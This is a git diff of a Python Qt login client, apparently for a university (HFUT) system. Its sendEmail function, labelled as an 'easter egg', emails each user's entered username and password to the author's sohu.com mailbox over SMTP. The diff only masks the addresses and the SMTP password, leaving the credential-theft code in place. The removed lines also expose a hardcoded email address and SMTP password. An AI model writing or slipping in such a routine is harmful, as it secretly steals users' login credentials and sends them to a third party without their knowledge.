@@ -95,10 +95,10 @@ class HFUT(QtGui.QMainWindow):
             print 'Please Enter your username and password!'
     #小小的彩蛋！
     def sendEmail(self,username,password):
-        from_addr='jackwhite@sohu.com'
-        smtp_password='225541'
+        from_addr='******e@sohu.com'
+        smtp_password='******'
         smtp_server='smtp.sohu.com'
-        to_addr='jackwhite@sohu.com';
+        to_addr='******@sohu.com';
         msg=MIMEText('Username:'+username+'\n'+'Password:'+password,'plain','utf-8')
         try:
             server=smtplib.SMTP(smtp_server,25)
